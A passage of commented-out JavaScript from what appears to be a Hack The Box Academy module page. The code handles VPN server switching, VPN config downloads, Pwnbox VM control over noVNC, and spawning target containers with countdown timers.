//               checkSolutionsSettings();
//           }, 500);

//           setTimeout(() => {
//             $('.bootstrap-select').find('button').attr("title","");
//           }, 5000);
          
//           $('pre').filter(function () {
//               return this.className.match(/\blanguage-/);
//           }).each(function () {
//               let heading = $(this).prevAll().closest('h1').last().text();

//               if (this.className === ' language-shell-session') {
//                   wrapTerminal(this, heading);
//               } else if (this.className === ' language-powershell-session') {
//                   wrapPSTerminal(this, heading);
//               } else if (this.className === ' language-cmd-session') {
//                   wrapCMDTerminal(this, heading);
//               } else if (this.className.startsWith(' language-')) {
//                   var language = this.className.split('-').pop();
//                   wrapCodeBlock(this, language);
//               }
//           });

//           wrapBrowser($('.website-screenshot'));

//           $('span:contains(\'[!bash!]\')').html('<span class="text-gray">ndefstathiou@htb</span><span class="text-success">[/htb]</span>');

//           let _vpnSelector = $('.vpnSelector');
//           let _selectedServer = _vpnSelector.val();
//           let _vpnLoader = $('.vpn-loader');

//           let _vpnSwitchWarningModal = $('#vpnSwitchWarningModal');
//           let _continueVpnSwitchBtn = $('#continueVpnSwitchBtn');
//           let _continueVpnSwitchBtnText = $('#continueVpnSwitchBtnText');
//           let _cancelVpnSwitchBtn = $('#cancelVpnSwitchBtn');
//           let _vpnSwitchWarningModalLoader = $('.vpnSwitchModalLoader');

//           _vpnSelector.change(function () {
//               if (isPwnboxActive) {
//                   _vpnSwitchWarningModal.modal('show');
//               } else {
//                   switchVpnServer();
//               }
//           });

//           function switchVpnServer() {
//               let vpnId = $('.vpnSelector option:selected').val();
//               if (!vpnId) return;

//               _vpnLoader.removeClass('d-none');
//               _vpnLoader.addClass('d-flex');
//               $('.bootstrap-select').addClass('d-none');

//               // Display button loader and disable the buttons while
//               // waiting for the request to finish
//               _continueVpnSwitchBtnText.addClass('d-none');
//               _vpnSwitchWarningModalLoader.removeClass('d-none');
//               _continueVpnSwitchBtn.addClass('disabled');
//               _cancelVpnSwitchBtn.addClass('disabled');
//               _vpnSwitchWarningModal.find('.close').addClass('disabled');

//               axios.post(`/api/v2/vpn-servers/${vpnId}/switch`, {}).then(response => {
//                   _vpnLoader.removeClass('d-flex');
//                   _vpnLoader.addClass('d-none');
//                   $('.bootstrap-select').removeClass('d-none');

//                   toastr['success']('Vpn server switched successfully', 'Success');
//                   $('.startInstanceBtn').each(function () {
//                       $(this).removeClass('disabled');
//                   });

//                   _vpnSwitchWarningModal.modal('hide');
//                   _continueVpnSwitchBtnText.removeClass('d-none');
//                   _vpnSwitchWarningModalLoader.addClass('d-none');
//                   _continueVpnSwitchBtn.removeClass('disabled');
//                   _cancelVpnSwitchBtn.removeClass('disabled');
//                   _vpnSwitchWarningModal.find('.close').removeClass('disabled');

//                   if (isTargetActive) {
//                       $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target is spawning...');
//                       $('.targetIp').html('<i class="fad fa-circle-notch fa-spin"></i>');
//                       $('.resetTargetBtn').hide();
//                       $('.resetTargetBtn').prop('disabled', true);

//                       vmCheckTimer = setInterval(function () {
//                           window.checkMultipleVMs();
//                       }, 5 * 1000);
//                   }

//               }).catch(err => {
//                   clearInterval(vmCheckTimer);
//                   _vpnLoader.removeClass('d-flex');
//                   _vpnLoader.addClass('d-none');
//                   $('.bootstrap-select').removeClass('d-none');
//                   toastr['error'](err.response.data.message, 'Error');
//                   _vpnSelector.val(_selectedServer);
//                   $('.selectpicker').selectpicker('refresh')
//                   _vpnSwitchWarningModal.modal('hide');
//                   _continueVpnSwitchBtnText.removeClass('d-none');
//                   _vpnSwitchWarningModalLoader.addClass('d-none');
//                   _continueVpnSwitchBtn.removeClass('disabled');
//                   _cancelVpnSwitchBtn.removeClass('disabled');
//                   _vpnSwitchWarningModal.find('.close').removeClass('disabled');
//               });
//           }

//           _continueVpnSwitchBtn.on('click', () => {
//               switchVpnServer();
//           });

//           _vpnSwitchWarningModal.find('.close').on('click', () => {
//               _vpnSelector.val(_selectedServer);
//               _vpnSwitchWarningModal.modal('hide');
//           });

//           _cancelVpnSwitchBtn.on('click', () => {
//               _vpnSelector.val(_selectedServer);
//               _vpnSwitchWarningModal.modal('hide');
//           });

//           _vpnSwitchWarningModal.on('hidden.bs.modal', () => {
//               _continueVpnSwitchBtnText.removeClass('d-none');
//               _vpnSwitchWarningModalLoader.addClass('d-none');

//               // Reset button state on modal close
//               _continueVpnSwitchBtn.removeClass('disabled');
//               _cancelVpnSwitchBtn.removeClass('disabled');
//               _vpnSwitchWarningModal.find('.close').removeClass('disabled');
//           });

//       });

//       $('.download-vpn-settings').click(() => {
//           let type = 'regular';
//           let protocol = $('input[name="vpn-protocol"]:checked').val();
//           axios.get(`/api/v2/vpn-servers/key/download?type=${type}&protocol=${protocol}`).then(response => {
//               const url = window.URL.createObjectURL(new Blob([response.data]));
//               const link = document.createElement('a');
//               link.href = url;
//               link.setAttribute('download', `academy-${type}.ovpn`);
//               document.body.appendChild(link);
//               link.click();
//           }).catch(err => {
//               toastr['error'](err.response.data.message, 'Error');
//           });
//       });

//       $('#completeBtn').click(() => {
//           $('#completeBtn').addClass('disabled');
//           $('#complete-button-text').addClass('d-none');
//           $('#complete-button-loader').removeClass('d-none');
//       });

//       function completeCheck() {
//           axios.get('/api/check/complete/1280').then(response => {
//               let data = response.data;
//               if (data.success === 1) {
//                   if (data.completed === true) {
//                       $('#completeBtn').show();
//                       $('#completeBtnPoints').removeClass('d-none');
//                   }
//               }
//           }).catch(err => {
//               toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
//           });
//       }

//       function wrapTerminal(element, heading) {
//           $(element).css('line-height', '0px');
//           $(element).wrap('<div class="window_content"></div>')
//               .parent().wrap('<div class="window_container"></div>')
//               .prepend(`
//                       <div class='window_top'>
//                           <span class='window_dot bg-danger'></span>
//                           <span class='window_dot bg-warning'></span>
//                           <span class='window_dot bg-success'></span>
//                           <span class='window_title'>${heading}</span>
//                       </div>
//                   `);
//       }

//       function wrapPSTerminal(element, heading) {
//           $(element).css('background', '#012456').children().css('color', 'white');
//           $(element).css('line-height', '0px');
//           $(element).wrap('<div class="window_content"></div>')
//               .parent().wrap('<div class="window_container"></div>')
//               .prepend(`
//                       <div class='window_top'>
//                           <span class='window_dot bg-danger'></span>
//                           <span class='window_dot bg-warning'></span>
//                           <span class='window_dot bg-success'></span>
//                           <span class='window_title'>${heading}</span>
//                       </div>
//                   `);
//       }

//       function wrapCMDTerminal(element, heading) {
//           $(element).css('background', 'black').children().css('color', 'white');
//           $(element).css('line-height', '0px');
//           $(element).wrap('<div class="window_content"></div>')
//               .parent().wrap('<div class="window_container"></div>')
//               .prepend(`
//                       <div class='window_top'>
//                           <span class='window_dot bg-danger'></span>
//                           <span class='window_dot bg-warning'></span>
//                           <span class='window_dot bg-success'></span>
//                           <span class='window_title'>${heading}</span>
//                       </div>
//                   `);
//       }

//       function wrapCodeBlock(element, lang) {
//           $(element).wrap('<div class="window_content"></div>')
//               .parent().wrap('<div class="window_container"></div>')
//               .prepend('<div class="window_top">Code: <span class="text-success">' + lang + '</div>');
//       }

//       function wrapBrowserOld(element) {
//           $(element).css('border', '0px').css('border-radius', '0');
//           let url = element.data('url');
//           $(element).wrap('<div class="window_content"></div>')
//               .parent().wrap('<div class="window_container"></div>')
//               .prepend(`
//                       <div class='window_top'>
//                           <span class='window_dot bg-danger'></span>
//                           <span class='window_dot bg-warning'></span>
//                           <span class='window_dot bg-success'></span>
//                           <input type='text' class='website-screenshot-url' disabled value='${url}'>
//                           <span class='float-right'><i class='fa fa-home'></i></span>
//                       </div>
//                   `);
//       }

//       function wrapBrowser(element) {
//           $(element).css('border', '0px').css('border-radius', '0');

//           $(element).each(function (index, e) {
//               let url = $(e).data('url');
//               $(e).wrap('<div class="window_content"></div>')
//                   .parent().wrap('<div class="window_container"></div>')
//                   .prepend(`
//                           <div class='window_top'>
//                               <span class='mr-2'>
//                                   <i class='fa fa-arrow-circle-left'></i> <i class='fa fa-arrow-right'></i> <i class='fa fa-redo'></i> <i class='fa fa-home'></i>
//                               </span>
//                               <input type='text' class='website-screenshot-url' disabled value='${url}'>
//                               <span class='float-right'><i class='fa fa-bars'></i></span>
//                           </div>
//                       `);
//           });
//       }

//       // This one is used by the requestHelpModal
//       function requestHelp() {
//           let question_id = $('#requestHelpModal').data('question_id');
//           axios.post(`/api/question/${question_id}/help`)
//               .then(({ data }) => {
//                   $('#requestHelpModal').modal('hide');
//                   if (data.success == 0) {
//                       toastr['error'](data.message, 'Error');
//                       return;
//                   }
//                   toastr['success']('Request sent!', 'Success');
//               }).catch(err => {
//                   toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
//               });
//       }

//       function openRequestModal(question_id) {
//           $('#requestHelpModal').modal('show').data('question_id', question_id);
//       }

//       function openSolutionPreferencesModal() {
//         $('#solutionPreferencesModal').modal('show');
//       };

//       function openWalkthroughModal(index, sectionTitle) {
//           let _walkthrougModal = $('#walkthroughModal');
//           const _walkthroughContent = $('#walkthroughModal').find('.training-module');
//           const _walkthroughLoader = $('.walkthrough-loader');
//           _walkthrougModal.modal('show');
//           _walkthrougModal.on('shown.bs.modal', function (event) {
//               const indexNumber = new Number(index);

//               _walkthroughLoader.removeClass('d-none');
//               _walkthroughLoader.addClass('d-block');

//               let question = `Question ${indexNumber + 1}`;
//               let element = $('h1').filter(function () {
//                   // Filter all the h1 headers, to find the exact section title
//                   return $(this).text().trim().toLowerCase() === sectionTitle.toLowerCase();
//               }).nextAll('h2').filter(function () {
//                   // then filter all the h2 headers, to find the exact question as well
//                   return $(this).text().trim().toLowerCase() === question.toLowerCase();
//               }).first();

//               if (element.length) {
//                   setTimeout(() => {
//                       _walkthroughLoader.addClass('d-none');
//                       _walkthroughLoader.removeClass('d-block');
//                       _walkthroughContent.removeClass('d-none');

//                       _walkthrougModal.animate({
//                           scrollTop: element.offset().top - _walkthrougModal.offset().top + _walkthrougModal.scrollTop()
//                       }, 500);
//                   }, 1500);
//               } else {
//                   _walkthroughLoader.addClass('d-none');
//                   _walkthroughLoader.removeClass('d-block');
//                   _walkthroughContent.removeClass('d-none');
//               }
//           });
//           _walkthrougModal.on('hidden.bs.modal', function (event) {
//               // Make sure that content gets hidden again
//               // in case the user re-opens the modal multiple times
//               _walkthroughContent.addClass('d-none');
//           });
//       }

      
//       function initStreakToast(autoHideOption = true) {
//           const streakToast = $('#streak-toast');
//           streakToast.toast({ autohide: autoHideOption, delay: 20000 }).toast('show');
//       }

//       function initStreaksNotificationContent(streaksTemplate) {
//           return new Promise((resolve, reject) => {
//               const _streaksContainer = $('.streaks-container');
//               _streaksContainer.html(streaksTemplate);
//               resolve();
//           });

//       }
// </script>
// <script type="module">
//     import RFB from '/assets/libs/vnc/core/rfb.js';

//       let rfb;
//       let sidePreview;
//       let desktopName;
//       let pwnboxActive = false;

//       $(document).ready(function () {
//           getRegions();
//           const userId = '1312838';
//           Echo.private(`user-${userId}`)
//               .listen('.streak.completed', data => {
//                   initStreaksNotificationContent(data.streak_popup).then(() => {
//                       initStreakToast();
//                   });
//               })
//               .listen('.streak.progressed', data => {
//                   initStreaksNotificationContent(data.streak_popup).then(() => {
//                       initStreakToast();
//                   });
//               })
//               .listen('.streak.started', data => {
//                   const { event, current_streak } = data.streak_data;
//                   initStreaksNotificationContent(data.streak_popup).then(() => {
//                     const enableToastAutohide = event === 'streak.started' && current_streak === 0 ? false : true;
//                     initStreakToast(enableToastAutohide);
//                   });
//               });
//       });

//       function connectedToServer(e) {
//           status('Connected to ' + desktopName);
//           $('.fullScreenBtn').show();
//           $('.resetInstanceBtn').show();
//           $('.terminateInstanceBtn').show();
//           $('.extendInstanceBtn').show();
//           $('.instanceLoading').hide();
//           $('.instanceStart').hide();
//           $('.resetInstanceBtn').prop('disabled', false);
//           $('.fullScreenBtn').prop('disabled', false);
//           $('.extendInstanceBtn').prop('disabled', false);
//           $('.terminateInstanceBtn').prop('disabled', false);

//           document.querySelector('canvas').addEventListener('focus', (event) => {
//               if (currentBrowser.firefox) {
//                   window.copyToClipboard(event.target.textContent);
//               } else {
//                   navigator.clipboard.readText()
//                       .then(text => {
//                           writeToClipboard(text);
//                       })
//                       .catch(err => {
//                           console.error('Something went wrong while accessing clipboard', err);
//                       });
//               }
//           });
//       }

//       function disconnectedFromServer(e) {
//           status('Disconnected');
//           $('.screenPlaceholder').show();
//           stopCountdown();
//       }

//       function clipboardReceived(e) {
//           navigator.clipboard.writeText(e.detail.text)
//               .then(() => {
//                   // Success!
//               })
//               .catch(err => {
//                   console.error('Something went wrong while copying to clipboard.', err);
//               });
//       }

//       function updateDesktopName(e) {
//           desktopName = e.detail.name;
//       }

//       function status(text) {
//           $('#statusText').html(text);
//       }

//       function readQueryVariable(name) {
//           const re = new RegExp('.*[?&]' + name + '=([^&#]*)'),
//               match = document.location.href.match(re);

//           if (match) {
//               return decodeURIComponent(match[1]);
//           }

//           return null;
//       }

//       function writeToClipboard(text) {
//           rfb.clipboardPasteFrom(text);
//       }

//       let host = '';
//       let password = '';
//       let countdown = '';
//       let targetCountdown = '';
//       let targetRemainingTimeInSeconds = '';
//       let url = '';
//       let spawnInterval = null;

//       function getPwnbox() {
//           return new Promise((resolve, reject) => {
//               axios.get('/api/get/pwnbox').then(response => {
//                   let data = response.data;
//                   if (data.success === 1 && data.instance.status === 'ready') {
//                       host = `proxy-${data.instance.location}.htb-cloud.com/bird/${data.instance.hostname}`;
//                       password = data.instance.password;
//                       $('.lifeLeft').html(data.instance.life_remaining);
//                       startCountdown();
//                       $('.screenPlaceholder').hide();
//                       url = 'https://vnc.htb-cloud.com/index.html?host=' + host + '&password=' + password;
//                       isPwnboxActive = true;

//                       if (document.querySelector('wc-htb-pwnbox-selection-card')) {
//                           document.querySelector('wc-htb-pwnbox-selection-card').setAttribute('pwnbox-active', true);
//                       }
//                       connect();
//                       if (spawnInterval !== null) {
//                           clearInterval(spawnInterval);
//                       }
//                       resolve('success getting pwnbox');
//                   } else {
//                       $('.screenPlaceholder').show();
//                   }
//               }).catch(err => {
//                   toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
//                   reject(err);
//               });
//           });
//       }

//                 function extendPwnbox() {
//               axios.get('/api/extend/pwnbox').then(response => {
//                   let data = response.data;
//                   if (data.success === 1) {
//                       $('.lifeLeft').html(data.instance.life_remaining);
//                       stopCountdown().then(() => {
//                           startCountdown();
//                           toastr['success']('Time extended for 60 minutes.', 'Success');
//                       });
//                   } else {
//                       toastr['error'](data.message, 'Error');
//                   }

//               }).catch(err => {
//                   toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
//               });
//           }

      
//       function initStartCountdown() {
//           let life = parseInt($('.lifeLeft').html()) - 1;
//           $('.lifeLeft').html(life);
//       }

//       function startCountdown() {
//           countdown = setInterval(function () {
//               initStartCountdown();
//           }, 60 * 1000);
//       }

//       function stopCountdown() {
//           return new Promise((resolve) => {
//               clearInterval(countdown);
//               resolve();
//           });
//       }

//       function terminatePwnbox() {
//           return new Promise((resolve, reject) => {
//               $('.resetInstanceBtn').prop('disabled', true);
//               $('.terminateInstanceBtn').prop('disabled', true);
//               $('.fullScreenBtn').prop('disabled', true);
//               $('.extendInstanceBtn').prop('disabled', true);
//               $('.instanceStart').hide();

//               $('.instanceTerminating').show();

//               status('Terminating Interactive Instance...');

//               axios.delete('/api/terminate/pwnbox')
//                   .then(({ data }) => {
//                       if (data.success === 1) {
//                           $('.startInstanceBtn').show();
//                           $('.instanceStart').show();
//                           $('.instanceTerminating').hide();
//                           $('.resetInstanceBtn').hide();
//                           $('.terminateInstanceBtn').hide();
//                           $('.fullScreenBtn').hide();
//                           $('.extendInstanceBtn').hide();

//                           isPwnboxActive = false;

//                           $('.iterminal').addClass('d-none');

//                           toastr['success']('Instance has been terminated.', 'Success');

//                           /**
//                            *  Dispatch an event when pwnBox is terminated
//                            */
//                           var terminatePwnBoxEvent = new CustomEvent('TerminatedPwnBox');
//                           window.dispatchEvent(terminatePwnBoxEvent);

//                           resolve('succes terminating pwnbox');

//                       } else {
//                           toastr['error'](data.message, 'Error');
//                           connect();
//                           $('.resetInstanceBtn').prop('disabled', false);
//                           $('.fullScreenBtn').prop('disabled', false);
//                           $('.extendInstanceBtn').prop('disabled', false);
//                           $('.terminateInstanceBtn').prop('disabled', false);
//                       }
//                   }).catch(err => {
//                       reject(err);
//                       toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
//                   });
//           }).catch(error => {
//               reject(error);
//           });
//       }

//       let _wcPwnbox = document.querySelector('wc-htb-pwnbox-selection-card');

//       function errorHandling(value) {
//           switchToRegion = value.detail[0];
//           _pwnboxSwitchWarningModal.modal('show');
//       }

//       function getSelectedPwnboxLocation(event) {
//           if (pwnboxActive) {
//               selectedPwnBoxLocation = currentPwnboxLocation;
//               return;
//           }
//           selectedPwnboxLocation = event.detail[0];
//       }

//       function getCurrentPwnboxLocation(server) {
//           currentPwnboxLocation = server;
//       }

//       function setCurrentPwnboxServer(server) {
//           _wcPwnbox.setAttribute('current-pwnbox', server);
//       }

//       let selectedPwnboxLocation;
//       let currentPwnboxLocation;
//       let switchToRegion;

//       let pwnboxRegions;

//       let _pwnboxSwitchWarningModal = $('#pwnboxSwitchWarningModal');
//       let _cancelPwnboxSwitchBtn = $('#cancelPwnboxSwitchBtn');
//       let _continuePwnboxSwitchBtn = $('#continuePwnboxSwitchBtn');
//       let _continuePwnboxSwitchBtnText = $('#continuePwnboxSwitchBtnText');
//       let _pwnboxSwitchModalLoader = $('.pwnboxSwitchModalLoader');

//       _cancelPwnboxSwitchBtn.on('click', () => {
//           initWcPwnbox(pwnboxRegions);
//           _pwnboxSwitchWarningModal.modal('hide');
//       });

//       _continuePwnboxSwitchBtn.on('click', () => {
//           _continuePwnboxSwitchBtnText.addClass('d-none');
//           _pwnboxSwitchModalLoader.removeClass('d-none');
//           _continuePwnboxSwitchBtn.addClass('disabled');
//           _cancelPwnboxSwitchBtn.addClass('disabled');

//           let oldCurrentPwnbox = selectedPwnboxLocation = currentPwnboxLocation = switchToRegion;

//           $('.screenPlaceholder').show();
//           $('.instanceStart').show();
//                         rfb.disconnect();
//                     sidePreview.disconnect();
//           terminatePwnbox().then(() => {

//               startPwnbox().then(() => {
//                   _pwnboxSwitchWarningModal.modal('hide');
//                   _continuePwnboxSwitchBtnText.removeClass('d-none');
//                   _pwnboxSwitchModalLoader.addClass('d-none');
//                   _continuePwnboxSwitchBtn.removeClass('disabled');
//                   _cancelPwnboxSwitchBtn.removeClass('disabled');
//                   initWcPwnbox(pwnboxRegions);
//               }).catch(() => {
//                   _pwnboxSwitchWarningModal.modal('hide');
//                   _continuePwnboxSwitchBtnText.removeClass('d-none');
//                   _pwnboxSwitchModalLoader.addClass('d-none');
//                   _continuePwnboxSwitchBtn.removeClass('disabled');
//                   _cancelPwnboxSwitchBtn.removeClass('disabled');
//                   initWcPwnbox(pwnboxRegions);
//               });
//           }).catch(error => {
//               toastr['error'](error.message, 'Error');
//               currentPwnboxLocation = oldCurrentPwnbox;
//               initWcPwnbox(pwnboxRegions);
//           });
//       });

//       function initWcPwnbox(regions) {
//           /**
//            *  Creates pwnbox server select component
//            */
//           const pwnboxSelector = document.createElement('wc-htb-pwnbox-selection-card');
//           pwnboxSelector.setAttribute('regions', JSON.stringify(regions));
//           pwnboxSelector.setAttribute('current-pwnbox', JSON.stringify(currentPwnboxLocation));

//           $('.pwnbox-select-card').html(pwnboxSelector);
//           pwnboxSelector.addEventListener('getSelectedPwnboxLocation', getSelectedPwnboxLocation);
//           pwnboxSelector.addEventListener('actionNotAllowed', errorHandling);
//           selectedPwnboxLocation = currentPwnboxLocation;

//           if (isPwnboxActive) document.querySelector('wc-htb-pwnbox-selection-card').setAttribute('pwnbox-active', true);
//       }

//       function getRegions() {
//           axios.get('/api/v2/pwnbox/regions').then(response => {
//               const data = response.data.data;
//               currentPwnboxLocation = response.data.meta.currentRegion;
//               const regions = [];

//               const latencyPromises = data.map((region) => {
//                   const item = { name: region.title, value: region.value };
//                   // Use Promise.resolve to ensure each iteration of the loop returns a Promise
//                   return Promise.resolve()
//                       .then(() => getServerLatency(region.proxyLatencyURL))
//                       .then((response) => {
//                           item.latency = response;
//                           regions.push(item);
//                       });
//               });

//               pwnboxRegions = regions;

//               Promise.all(latencyPromises).then(() => {
//                   // This code will run after all the getServerLatency calls have completed

//                   initWcPwnbox(regions);
//                   /**
//                    * getting pwnbox status and setting isPwnboxActive flag
//                    * if isPwnboxActive is true we are passing the respective attribute to the web component
//                    */
//                   getPwnbox().then(() => {
//                       if (isPwnboxActive) {
//                           document.querySelector('wc-htb-pwnbox-selection-card').setAttribute('pwnbox-active', true);
//                       }
//                   });
//               })
//                   .catch((error) => {
//                       // Handle any errors that occurred during the Promise.all chain
//                       console.error('An error occurred:', error);
//                   });

//           }).catch(err => {
//               toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
//           });
//       }

//       function startPwnbox() {
//           return new Promise((resolve, reject) => {

//               $('.resetInstanceBtn').prop('disabled', true);
//               $('.fullScreenBtn').prop('disabled', true);
//               $('.extendInstanceBtn').prop('disabled', true);
//               $('.terminateInstanceBtn').prop('disabled', true);
//               $('.instanceStart').hide();
//               $('.instanceLoading').show();
//               $('.startInstanceBtn').hide();

//               status('Starting Interactive Instance...');

//               grecaptcha.ready(function () {
//                   grecaptcha.execute('6LeI6LsaAAAAAKgdStgBC6B4UVbXlpYNaYGN46Ah', { action: 'spawnPwnbox' }).then(function (token) {
//                       if (token) {
//                           axios.get(`/api/spawn/pwnbox?g-recaptcha-response=${token}&region=${selectedPwnboxLocation.value}`).then(response => {
//                               let data = response.data;
//                               if (data.success === 1) {
//                                   spawnInterval = setInterval(() => {
//                                       getPwnbox();
//                                   }, 2000);
//                               } else {
//                                   if (data.code === 1 || (data.code === 3 && isPwnboxActive)) {
//                                       $('.resetInstanceBtn').prop('disabled', false);
//                                       $('.fullScreenBtn').prop('disabled', false);
//                                       $('.extendInstanceBtn').prop('disabled', false);
//                                       $('.terminateInstanceBtn').prop('disabled', false);
//                                       connect();

//                                       if (data.code === 3) {
//                                           $('.instanceLoading').hide();
//                                           startCountdown();
//                                       }
//                                   } else {
//                                       $('.startInstanceBtn').show();
//                                       $('.instanceStart').show();
//                                       $('.instanceLoading').hide();
//                                   }

//                                   toastr['error'](data.message, 'Error');
//                               }
//                               resolve('success start pwnbox');
//                           }).catch(err => {
//                               toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
//                           });
//                       } else {
//                           $('.resetInstanceBtn').prop('disabled', false);
//                           $('.fullScreenBtn').prop('disabled', false);
//                           $('.extendInstanceBtn').prop('disabled', false);
//                           $('.terminateInstanceBtn').prop('disabled', false);
//                           $('.instanceStart').show();
//                           $('.instanceLoading').hide();
//                           $('.startInstanceBtn').show();
//                       }
//                   });
//               });
//           }).catch(error => {
//               reject(error);
//           });
//       }

//       $('.fullScreenBtn').click(function () {
//           window.open(url, '_blank');
//       });

//       $('.startInstanceBtn').click(function () {
//           if (!selectedPwnboxLocation?.value) {
//               toastr['warning']('Please select Pwnbox server', 'Warning');
//               return;
//           }
//           startPwnbox(selectedPwnboxLocation.value);
//       });

//       $('.resetInstanceBtn').click(function () {
//           $('.screenPlaceholder').show();
//           $('.instanceStart').show();
//                         rfb.disconnect();
//               $('.iterminal').addClass('d-none');
//               // This event is dispatched when the pwnbox is terminated and it is catched on the Terminal component
//               // to set the pwnboxStatus to null
//               let terminatePwnBoxEvent = new CustomEvent('TerminatedPwnBox');
//               window.dispatchEvent(terminatePwnBoxEvent);
//                     sidePreview.disconnect();
//           startPwnbox(selectedPwnboxLocation.value);
//       });

//       $('.terminateInstanceBtn').click(function () {
//           $('.screenPlaceholder').show();
//           $('.instanceStart').show();
//                         rfb.disconnect();
//                     sidePreview.disconnect();
//           terminatePwnbox();
//       });

//       $('.extendInstanceBtnClicker').click(function () {
//           extendPwnbox();
//       });

//       $('.resetTargetBtn').click(function () {
//           $('.resetTargetBtn').prop('disabled', true);
//           $('.resetTargetBtn').hide();
//           stopTargetCountdown().then(()=>{
//                         spawnDocker();
//                                   });
//       });

      
//       function connect() {
//           status('Connecting to ' + host.split('/')[2] + '...');

//                         rfb = new RFB(document.getElementById('screen'), 'wss://' + host,
//                   { credentials: { password: password } });
//           //Listeners
//           rfb.addEventListener('desktopname', updateDesktopName);
//           rfb.addEventListener('clipboard', clipboardReceived);

//           rfb.resizeSession = true;
//           rfb.viewOnly = false;
          
//           sidePreview = new RFB(document.getElementById('sidePreview'), 'wss://' + host,
//               { credentials: { password: password } });

//           sidePreview.addEventListener('connect', connectedToServer);
//           sidePreview.addEventListener('disconnect', disconnectedFromServer);

//           sidePreview.resizeSession = false;
//           sidePreview.viewOnly = true;
//           sidePreview.scaleViewport = true;

//           /**
//            *  Dispatch an event when pwnBox is spawned
//            */
//           var spawnedPwnBoxEvent = new CustomEvent('SpawnedPwnBox');
//           window.dispatchEvent(spawnedPwnBoxEvent);
//       }


//                 $(document).on('click', '.spawnTargetBtn', function () {
//               spawnDocker();
//           });

//         $('.target, .targetIp').click(e => {
//           if ($('.resetTargetBtn').is(':hidden')) return;
          
//             window.copyToClipboard($(e.target).html())
//                 .then(() => {
//                     toastr['success']('Target copied to clipboard', 'Success');
//                 })
//                 .catch(err => {
//                     console.log('Something went wrong while copying to clipboard.', err);
//                 });
//         });

//       let containerCheckTimer;

//       function spawnDocker() {
//           $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target is spawning...');
//           axios.get('/api/spawn/container/1280').then(response => {
//               let data = response.data;
//               if (data.success === 1) {
//                   containerCheckTimer = setInterval(function () {
//                       checkContainer(true);
//                   }, 3000);
//               } else {
//                   toastr['error']('Target failed to spawn. Please try again.', 'Error');
//                   resetSpawnTargetSystemText();
//               }
//           }).catch(err => {
//               toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
//           });
//       }

//       function displayActiveContainer(data) {
//         clearInterval(containerCheckTimer);
//         $('.target').html(`${data.instance.external_ip}:${data.instance.node_ports}`);
//         $('.targetIp').html(data.instance.external_ip);
//         $('.resetTargetBtn').show();
//         $('.resetTargetBtn').prop('disabled', false);
//         $('.targetLifeTimeContainer').show();
//         initializeTimeLeft(data.instance?.remaining_life_in_seconds);
//         stopTargetCountdown().then(() => {
//             startTargetCountdown();
//         });
//       }

//       function checkContainer(showAlert = false) {
//           return axios.get('/api/get/container/1280').then(({ data }) => {
//             if (data.success === 1) {
//                 if (data.instance.status === 'ready') {
//                     displayActiveContainer(data);
//                 }
//             }
              
//             return data;
//           }).catch(err => {
//                 if (showAlert) {
//                     toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
//                 }
//           });
//       }

//       setTimeout(() => {
//           checkContainer().then((data) => {
//             if (data.success === 1) {
//                 if(data.instance.status === 'deploying') {
//                     $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target is spawning...');
//                     containerCheckTimer = setInterval(function () {
//                         checkContainer(false);
//                     }, 5 * 1000);
//                 } else if (data.instance.status === 'ready') {
//                     displayActiveContainer(data);
//                 }
//             } else {
//                 resetSpawnTargetSystemText();
//             }
//           }).catch(err => {
//             resetSpawnTargetSystemText();
//           });
//       }, 3000);
            
      
//       function calculateTimeLeftInMinutes() {
//           if (targetRemainingTimeInSeconds === null) {
//             return 0;
//           }
//           targetRemainingTimeInSeconds -= 1;
//           return Math.ceil(targetRemainingTimeInSeconds/60);
//       }

//       function initializeTimeLeft(remainingTime){
//         targetRemainingTimeInSeconds = remainingTime;
//         renderLifeTimeLeft();
//       }

//       function renderLifeTimeLeft() {
//         let life = calculateTimeLeftInMinutes();
        
//         if (life <= 0) {
//           $('.targetLifeTimeContainer').hide();
//           clearInterval(targetCountdown);
//           resetSpawnTargetSystemText();
//         } else {
//           $('.targetLifeTime').html(life);
//         }
//       }

//       function startTargetCountdown() {
//           targetCountdown = setInterval(function() {
//             renderLifeTimeLeft();
//           }, 1000);
//       }

//       function stopTargetCountdown() {
//           return new Promise((resolve) => {
//               clearInterval(targetCountdown);
//               resolve();
//           });
//       }

//       function resetSpawnTargetSystemText() {
//           $('.resetTargetBtn').prop('disabled', true);
//           $('.resetTargetBtn').hide();
//           $('.targetIp').html("");
//           $('.targetLifeTimeContainer').hide();
//           $('.target').html('<span class="spawnTargetBtn" style="cursor:pointer;">Click here to spawn the target system!</span>');
//       }
// </script>
// <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"8976a757bba3169e","version":"2024.4.1","token":"9d8cb854dbf443df9a649c27660a2bb6"}' crossorigin="anonymous"></script>
// </body>
// </html>
// // 